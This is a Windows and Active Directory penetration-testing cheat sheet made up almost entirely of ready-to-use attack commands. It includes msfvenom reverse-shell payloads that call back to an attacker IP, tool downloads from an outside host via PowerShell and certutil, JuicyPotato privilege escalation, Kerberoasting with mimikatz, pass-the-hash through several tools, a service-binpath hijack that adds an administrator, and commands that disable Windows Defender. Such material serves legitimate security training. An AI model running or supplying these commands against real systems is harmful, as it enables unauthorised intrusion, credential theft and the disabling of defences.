

**[+] Create reverse shell using msfvenom**

```
// Meterpreter
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.119.126 LPORT=443 -f exe > reverse.exe
// TCP
msfvenom -p  windows/shell/reverse_tcp LHOST=192.168.119.126 LPORT=443 -f exe > reverse.exe
```

**[+] Upload file using Powershell**

```
powershell.exe $ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest http://192.168.50.48/ASREPRoast.ps1 -OutFile C:\users\hitman\ASREPRoast.ps1
```

**[+] Upload file using certutil.exe**

```
certutil.exe -urlcache -f http://192.168.50.48/Rubeus.exe C:\users\hitman\Rubeus.exe
```

**[+] Privilege escalation using juicy potato (Sometimes you need to attach CLSID)**

```
JuicyPotato.exe -l 13373 -p c:\windows\system32\cmd.exe -a "/c c:/users/public/reverse.exe" -t *
```

**[+] Request Ticket (powershell)**

```
Add-Type -AssemblyName System.IdentityModel  

New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLService/ufc-db1.us.funcorp.local"  
```

**[+] Export Tickets using mimikatz**

```
mimikatz # kerberos::list /export  
```

**[+] Crack ticket using Tgsrepcrack.py (You can use john too or hashcat)**

```
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.hitmanalharbi.local~1433-boo.LOCAL.kirbi  
```

**[+] Pass the hash using pth-winexe (Available in Kali Linux)**

```
pth-winexe -U USER%aad3b435b51404eeaad3b435b51404ee:NTLM //IP cmd
```

**[+] Access RDP using pass the hash (xfreerdp tool)**

```
xfreerdp /u:username /pth:NTLM /d:domain /v:IP
```

**[+] Pass the hash using PsExec.py**

```
python3 /usr/share/doc/python3-impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:NTLM sqldevadmin@192.168.50.49
```


**[+] enum SMB shares using smbclient (Smbclient available in Kali Linux)**

```
smbclient -L IP
```

**[+] Bypass Powershell Execution Policy**

```
Set-ExecutionPolicy -ExecutionPolicy Unrestricted

or run powershell like this:

powershell.exe -ep bypass
```

**[+] PowerUp.ps1  "Good powershell script for windows privilege escalation"**

```
C:> powershell.exe -nop -exec bypass

PS C:\> Import-Module PowerUp.ps1

PS C:\> Invoke-AllChecks | Out-File -Encoding ASCII checks.txt
```

**[+] Weak service permissions privilege escalation**

```
C:\Users\victim\Desktop>accesschk64 -uwcqv "victim" *

Accesschk v6.14 - Reports effective permissions for securable objects
Copyright ⌐ 2006-2021 Mark Russinovich
Sysinternals - www.sysinternals.com

RW SNMPTRAP
        SERVICE_ALL_ACCESS

C:\Users\victim\Desktop>sc qc SNMPTRAP

[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: SNMPTRAP
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\System32\snmptrap.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : SNMP Trap
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem

C:\Users\victim\Desktop>sc config SNMPTRAP binpath= "net localgroup administrators victim /add"
[SC] ChangeServiceConfig SUCCESS

C:\Users\victim\Desktop>sc config SNMPTRAP obj= ".\LocalSystem" password= ""

[SC] ChangeServiceConfig SUCCESS

C:\Users\victim\Desktop>sc start SNMPTRAP
```

**[+] Disable windows defender (Need privileges)**

```
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1

powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true
```

**[+] Sharphound command**

```
// EXE version
./SharpHound.exe --CollectionMethod All

// Powershell version
Invoke-BloodHound -CollectionMethod All
```

**[+] Enable RDP, and allow it in the firewall too (Need privileges)**

```
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

netsh advfirewall firewall set rule group="remote desktop" new enable=yes
```
